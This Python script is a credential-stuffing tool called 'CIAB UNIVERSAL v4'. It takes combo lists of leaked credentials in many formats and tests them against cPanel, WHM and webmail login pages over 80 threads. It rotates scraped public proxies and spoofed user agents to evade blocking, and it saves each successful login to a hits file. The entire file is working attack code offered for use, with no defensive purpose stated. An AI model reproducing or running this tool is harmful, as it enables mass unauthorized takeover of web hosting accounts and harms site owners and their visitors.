#!/usr/bin/env python3
"""
CIAB UNIVERSAL v4 - Universal Combo Checker + Auto Proxy
Supports ALL formats including:
  - host:port:user:pass
  - user:pass@host:port
  - http://host:port:user:pass
  - url|user|pass
  - host:port user pass
  - email:pass@host
NO DUPLICATE REMOVAL - every line tested!
"""

import requests
import re
import sys
import os
import random
import threading
import queue
import time
import json
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

# ============== CONFIG ==============
MAX_THREADS = 80
TIMEOUT = 12
HIT_FILE = "hit.txt"
FAIL_FILE = "fail.txt"
WORKING_PROXY_FILE = "working_proxies.txt"
PROXY_REFRESH_INTERVAL = 180
MAX_PROXIES = 300
# ====================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
]

# Global
hits_count = 0
total_tested = 0
lock = threading.Lock()
proxy_pool = []
proxy_blacklist = set()
stop_event = threading.Event()


# ============================================================
# 🛡️ AUTO PROXY ENGINE
# ============================================================

def fetch_proxies_all():
    """Fetch proxies from ALL sources."""
    all_proxies = set()
    
    # Source 1: ProxyScrape HTTP
    try:
        r = requests.get(
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
            timeout=10
        )
        if r.status_code == 200:
            for line in r.text.strip().split('\n'):
                line = line.strip()
                if line and ':' in line:
                    all_proxies.add(line)
    except:
        pass
    
    # Source 2: ProxyScrape SOCKS4
    try:
        r = requests.get(
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
            timeout=10
        )
        if r.status_code == 200:
            for line in r.text.strip().split('\n'):
                line = line.strip()
                if line and ':' in line:
                    all_proxies.add(line)
    except:
        pass
    
    # Source 3: ProxyScrape SOCKS5
    try:
        r = requests.get(
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
            timeout=10
        )
        if r.status_code == 200:
            for line in r.text.strip().split('\n'):
                line = line.strip()
                if line and ':' in line:
                    all_proxies.add(line)
    except:
        pass
    
    # Source 4: TheSpys
    try:
        r = requests.get("https://spys.me/proxy.txt", timeout=10)
        if r.status_code == 200:
            for line in r.text.split('\n'):
                if ':' in line and (line[0].isdigit() or line[0] == 's'):
                    parts = line.split()
                    if parts:
                        p = parts[0].strip()
                        if ':' in p:
                            all_proxies.add(p)
    except:
        pass
    
    # Source 5: Geonode
    try:
        r = requests.get(
            "https://proxylist.geonode.com/api/proxy-list?limit=200&page=1&sort_by=lastChecked&sort_type=desc",
            timeout=10
        )
        if r.status_code == 200:
            data = r.json()
            for item in data.get('data', []):
                ip = item.get('ip', '')
                port = item.get('port', '')
                if ip and port:
                    all_proxies.add(f"{ip}:{port}")
    except:
        pass
    
    # Source 6: local proxy.txt
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    all_proxies.add(line)
    
    return list(all_proxies)


def test_proxy_quality(proxy):
    """Test proxy quality - returns True if proxy is working."""
    test_urls = ["http://httpbin.org/ip", "http://api.ipify.org"]
    test_url = random.choice(test_urls)
    
    try:
        start = time.time()
        r = requests.get(
            test_url,
            proxies={'http': f"http://{proxy}", 'https': f"http://{proxy}"},
            timeout=5
        )
        latency = time.time() - start
        return r.status_code == 200 and latency < 3.0
    except:
        return False


def validate_and_clean_proxies(proxy_list):
    """Validate proxies and keep only working ones."""
    if not proxy_list:
        return []
    
    print(f"[🔍] Testing {len(proxy_list)} proxies quality...")
    
    working = []
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(test_proxy_quality, p): p for p in proxy_list[:200]}
        for future in as_completed(futures):
            proxy = futures[future]
            try:
                if future.result():
                    working.append(proxy)
            except:
                continue
    
    remaining = [p for p in proxy_list[200:] if p not in proxy_blacklist]
    working.extend(remaining)
    
    random.shuffle(working)
    
    with open(WORKING_PROXY_FILE, 'w') as f:
        for p in working:
            f.write(f"{p}\n")
    
    return working[:MAX_PROXIES]


def refresh_proxy_pool():
    """Refresh proxy pool from all sources."""
    global proxy_pool
    
    print("\n[🔄] Refreshing proxy pool...")
    raw_proxies = fetch_proxies_all()
    print(f"[+] Raw proxies: {len(raw_proxies)}")
    
    clean = [p for p in raw_proxies if p not in proxy_blacklist]
    print(f"[+] After removing blacklisted: {len(clean)}")
    
    proxy_pool = validate_and_clean_proxies(clean)
    print(f"[+] Working proxies: {len(proxy_pool)}")
    
    return proxy_pool


def get_proxy():
    """Get a random working proxy."""
    global proxy_pool
    
    if len(proxy_pool) < 10:
        refresh_proxy_pool()
    
    if not proxy_pool:
        return None
    
    return random.choice(proxy_pool)


def mark_proxy_bad(proxy):
    """Mark proxy as bad and remove from pool."""
    global proxy_pool
    if proxy:
        proxy_blacklist.add(proxy)
        if proxy in proxy_pool:
            proxy_pool.remove(proxy)


# ============================================================
# 🎯 UNIVERSAL EXTRACTION
# ============================================================

def extract_credentials_universal(line):
    """Extract from ANY format."""
    raw = line.strip().replace('\ufeff', '').replace('\r', '')
    if not raw or len(raw) < 6:
        return None
    
    result = None
    
    # FORMAT 1: host:port:user:pass
    if raw.count(':') >= 3:
        parts = raw.split(':')
        if len(parts) >= 4:
            host = parts[0]
            port = parts[1]
            user = parts[2]
            pwd = ':'.join(parts[3:])
            pwd = pwd.strip()
            scheme = "https" if port in ('2083', '2096') else "http"
            url = f"{scheme}://{host}:{port}"
            result = (url, user, pwd)
    
    # FORMAT 2: user:pass@host:port
    if not result and '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            result = (right, user, pwd)
    
    # FORMAT 3: url|user|pass
    if not result and '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            result = (parts[0].strip(), parts[1].strip(), '|'.join(parts[2:]).strip())
    
    # FORMAT 4: user:pass host:port
    if not result:
        m = re.search(r'([^\s]+):([^\s]+)\s+([^\s]+):(\d+)', raw)
        if m:
            user, pwd, host, port = m.group(1), m.group(2), m.group(3), m.group(4)
            scheme = "https" if port in ('2083', '2096') else "http"
            url = f"{scheme}://{host}:{port}"
            result = (url, user, pwd)
    
    # FORMAT 5: http://host:port:user:pass
    if not result:
        m = re.search(r'(https?://[^:]+:\d+):([^:]+):(.+)', raw)
        if m:
            url, user, pwd = m.group(1), m.group(2), m.group(3)
            result = (url, user, pwd)
    
    # FORMAT 6: url with user pass tokens
    if not result:
        url_match = re.search(r'(https?://[^\s:]+(?::\d+)?)', raw)
        if url_match:
            url = url_match.group(1)
            rest = raw[url_match.end():].strip()
            tokens = re.findall(r'[^\s|,;:\"\'=]+', rest)
            if len(tokens) >= 2:
                result = (url, tokens[0], tokens[1])
    
    # FORMAT 7: domain + user + pass
    if not result:
        domain_match = re.search(r'((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}(?::\d+)?)', raw)
        if domain_match:
            domain = domain_match.group(1)
            rest = raw[domain_match.end():].strip()
            tokens = re.findall(r'[^\s|,;:\"\'=]+', rest)
            if len(tokens) >= 2:
                port_match = re.search(r':(\d+)', domain)
                port = port_match.group(1) if port_match else '2082'
                scheme = "https" if port in ('2083', '2096') else "http"
                url = f"{scheme}://{domain}"
                result = (url, tokens[0], tokens[1])
    
    # FORMAT 8: email:pass@host
    if not result:
        email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', raw)
        if email_match:
            email = email_match.group(1)
            rest = raw[email_match.end():].strip()
            tokens = re.findall(r'[^\s|,;:\"\'=]+', rest)
            if tokens:
                domain2 = email.split('@')[1]
                url = f"http://{domain2}"
                result = (url, email, tokens[0])
    
    if result:
        url, user, pwd = result
        url = url.strip().rstrip('/')
        pwd = pwd.strip().lstrip('@').rstrip('@')
        user = user.strip()
        
        if url and user and pwd:
            return (url, user, pwd)
    
    return None


def normalize_url_universal(url):
    """Normalize URL for cPanel."""
    url = url.strip().rstrip('/')
    
    if not url.startswith(('http://', 'https://')):
        if ':2083' in url or ':2096' in url:
            url = 'https://' + url
        else:
            url = 'http://' + url
    
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    
    url = re.sub(r'[^a-zA-Z0-9:/._-]', '', url)
    return url.rstrip('/')


# ============================================================
# 🔑 CPANEL TEST LOGIN
# ============================================================

def test_cpanel_login(url, user, pwd, proxy=None, retries=2):
    """Test cPanel login."""
    url = normalize_url_universal(url)
    login_url = f"{url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    
    for attempt in range(retries):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            
            if proxy:
                proxies_dict = {
                    'http': f"http://{proxy}",
                    'https': f"http://{proxy}"
                }
                resp = requests.post(
                    login_url, data=payload,
                    timeout=TIMEOUT, verify=False,
                    allow_redirects=False,
                    proxies=proxies_dict,
                    headers=headers
                )
            else:
                resp = requests.post(
                    login_url, data=payload,
                    timeout=TIMEOUT, verify=False,
                    allow_redirects=False,
                    headers=headers
                )
            
            if resp.status_code == 200 and ('security_token' in resp.text or 'cpsess' in resp.text):
                return True, url, None
                
        except requests.exceptions.ProxyError:
            mark_proxy_bad(proxy)
            try:
                resp = requests.post(
                    login_url, data=payload,
                    timeout=TIMEOUT, verify=False,
                    allow_redirects=False,
                    headers={'User-Agent': random.choice(USER_AGENTS)}
                )
                if resp.status_code == 200 and ('security_token' in resp.text or 'cpsess' in resp.text):
                    return True, url, None
            except:
                pass
            continue
            
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            if proxy:
                mark_proxy_bad(proxy)
            continue
        except Exception:
            continue
    
    return False, url, None


# ============================================================
# 👷 WORKER THREAD
# ============================================================

def worker(combo_queue):
    global hits_count, total_tested
    
    while not stop_event.is_set():
        try:
            url, user, pwd = combo_queue.get_nowait()
        except queue.Empty:
            break
        
        with lock:
            total_tested += 1
            current_num = total_tested
        
        proxy = get_proxy()
        
        sys.stdout.write(f"\r[{current_num}] 🔍 {user}@{url} ")
        if proxy:
            sys.stdout.write(f"[{proxy[:15]}...]")
        sys.stdout.write(" ... ")
        sys.stdout.flush()
        
        success, norm_url, _ = test_cpanel_login(url, user, pwd, proxy)
        
        if success:
            with lock:
                hits_count += 1
                hit_num = hits_count
            
            # INSTANT SAVE - Zero Loss
            with open(HIT_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{user}:{pwd}@{norm_url}\n")
                f.flush()
                os.fsync(f.fileno())
            
            print(f"\n")
            print(f"╔══════════════════════════════════════════════╗")
            print(f"║  💥 HIT #{hit_num} FOUND! 💥                  ║")
            print(f"╠══════════════════════════════════════════════╣")
            print(f"║  📍 URL:      {norm_url:<30}║")
            print(f"║  👤 Username:  {user:<30}║")
            print(f"║  🔑 Password:  {pwd:<30}║")
            print(f"║  📊 Total:     {hit_num} hits / {current_num} tested        ║")
            print(f"╚══════════════════════════════════════════════╝")
            print()
        else:
            with lock:
                with open(FAIL_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"{user}:{pwd}@{url}\n")
        
        combo_queue.task_done()


# ============================================================
# 🖥️ PROXY REFRESH DAEMON
# ============================================================

def proxy_daemon():
    while not stop_event.is_set():
        time.sleep(PROXY_REFRESH_INTERVAL)
        if not stop_event.is_set():
            try:
                refresh_proxy_pool()
            except:
                pass


# ============================================================
# 📊 MAIN
# ============================================================

def show_banner():
    print(r"""
╔══════════════════════════════════════════════════════╗
║      CIAB UNIVERSAL v4 - ULTIMATE EDITION           ║
║                                                     ║
║  🛡️ Auto Proxy Engine (ProxyScrape+TheSpys+Geonode)║
║  🎯 Universal Extraction - ALL formats supported     ║
║  🔥 80 Threads - Maximum Speed                      ║
║  💾 Zero Loss - Instant Hit Saving                  ║
║  🧹 Auto Clean - Bad proxies removed automatically  ║
║  📋 NO DUPLICATE REMOVAL - Every line tested        ║
╚══════════════════════════════════════════════════════╝
    """)


def main():
    global proxy_pool
    
    show_banner()
    
    if len(sys.argv) > 1:
        filename = sys.argv[1]
    else:
        filename = (combo.txt)
    
    if not os.path.exists(filename):
        print(f"[!] File not found: {filename}")
        return
    
    # Initialize proxy pool
    print("[🌐] Initializing auto proxy engine...")
    refresh_proxy_pool()
    
    # Start proxy refresh daemon
    daemon = threading.Thread(target=proxy_daemon, daemon=True)
    daemon.start()
    
    # Read combo file
    print(f"\n[📂] Reading: {filename}")
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    print(f"[+] Total lines: {len(lines)}")
    
    # Universal extraction - NO DUPLICATE REMOVAL
    print("[🔍] Universal extraction (all formats)...")
    combos = []
    
    for line in lines:
        creds = extract_credentials_universal(line)
        if creds:
            combos.append(creds)
    
    if not combos:
        print("[!] No combos extracted!")
        print("[!] Sample from file:")
        for i, line in enumerate(lines[:3]):
            print(f"    Line {i+1}: {line.strip()[:80]}")
        return
    
    print(f"[+] Extracted: {len(combos)} combos (ALL lines kept, no removal)")
    
    # Show sample
    print(f"\n[📝] Sample combos:")
    for i, (url, user, pwd) in enumerate(combos[:3]):
        print(f"    {i+1}. {user}@{url} pass:{pwd[:8]}...")
    
    # Clear files
    with open(HIT_FILE, 'w', encoding='utf-8') as f:
        f.write(f"# CIAB UNIVERSAL v4 Hits - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    with open(FAIL_FILE, 'w', encoding='utf-8') as f:
        f.write(f"# CIAB UNIVERSAL v4 Failed\n")
    
    print(f"\n[⚙️] Configuration:")
    print(f"    Threads:    {MAX_THREADS}")
    print(f"    Timeout:    {TIMEOUT}s")
    print(f"    Proxies:    {len(proxy_pool)}")
    print(f"    Hit file:   {HIT_FILE}")
    print(f"    Fail file:  {FAIL_FILE}")
    
    combo_queue = queue.Queue()
    for c in combos:
        combo_queue.put(c)
    
    num_workers = min(MAX_THREADS, len(combos))
    print(f"\n[🚀] Launching {num_workers} workers...")
    print(f"[🎯] Targets: cPanel/WHM/Webmail")
    print(f"[💾] Zero Loss: ENABLED (instant save)")
    print(f"\n{'='*60}")
    print(" Press Ctrl+C to stop")
    print(f"{'='*60}\n")
    
    threads = []
    for _ in range(num_workers):
        t = threading.Thread(target=worker, args=(combo_queue,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        print("\n\n⛔ STOPPED BY USER")
    
    # FINAL SUMMARY
    print(f"\n{'='*70}")
    print(f"📊 FINAL RESULTS")
    print(f"{'='*70}")
    print(f"  📁 File:     {filename}")
    print(f"  📊 Lines:    {len(lines)}")
    print(f"  📊 Combos:   {len(combos)}")
    print(f"  🔄 Tested:   {total_tested}")
    print(f"  ✅ Hits:     {hits_count}")
    if total_tested > 0:
        print(f"  📈 Rate:     {(hits_count/total_tested)*100:.2f}%")
    print(f"  💾 Saved:    {HIT_FILE}")
    print(f"  🖥️  Proxies: {len(proxy_pool)} active")
    print(f"{'='*70}")
    
    if hits_count > 0:
        print(f"\n📄 Last hits:")
        with open(HIT_FILE, 'r') as f:
            lines_out = [l.strip() for l in f if l.strip() and not l.startswith('#')]
        for i, l in enumerate(lines_out[-5:], 1):
            print(f"   {i}. {l}")
    
    print(f"\n✨ Done!\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Exited")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
